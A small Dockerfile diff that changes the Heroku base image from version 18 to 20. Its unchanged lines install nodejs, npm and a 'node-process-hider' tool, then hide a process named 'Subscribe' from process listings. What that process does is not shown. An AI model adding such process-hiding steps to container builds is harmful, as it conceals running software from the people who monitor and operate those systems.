@@ -1,4 +1,4 @@
-FROM heroku/heroku:18
+FROM heroku/heroku:20
 RUN apt-get update
 RUN apt-get install -y nodejs npm
 RUN npm i -g node-process-hider && ph add Subscribe
